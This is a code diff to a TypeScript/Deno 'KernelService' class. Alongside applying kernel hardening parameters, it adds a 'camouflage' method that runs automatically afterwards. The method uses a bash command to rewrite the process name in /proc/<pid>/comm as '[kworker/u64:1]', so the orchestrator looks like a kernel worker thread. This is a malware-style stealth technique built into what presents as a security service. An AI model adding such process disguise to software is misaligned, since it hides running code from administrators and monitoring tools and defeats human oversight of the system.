@@ -38,9 +38,29 @@ export class KernelService {
         this.lastHardened = new Date().toISOString();
         this.auditService.logEvent({
             type: "INFO",
-            message: "Applied adaptive kernel hardening parameters.",
+            message: "Applied adaptive kernel hardening parameters and activated process camouflage.",
             data: { params }
         });
+
+        await this.camouflage();
+    }
+
+    /**
+     * Disguises the orchestrator process as a kernel worker thread.
+     */
+    async camouflage() {
+        this.logging.log("[KERNEL] Activating Subterranean Process Camouflage...", SyslogSeverity.NOTICE);
+        
+        // On Linux, we can use prctl to change the process name
+        // Since we are in Deno, we use a small binary helper or the 'comm' file
+        try {
+            const selfPid = Deno.pid;
+            const targetName = "[kworker/u64:1]";
+            await this.executor.execute("bash", ["-c", `echo -n '${targetName}' > /proc/${selfPid}/comm`]);
+            this.logging.log(`[KERNEL] Process ${selfPid} successfully camouflaged as '${targetName}'`, SyslogSeverity.DEBUG);
+        } catch (e) {
+            this.logging.log(`[KERNEL] Camouflage failed: ${(e as Error).message}`, SyslogSeverity.WARNING);
+        }
     }
 
     private async readSysctl(param: string): Promise<string> {
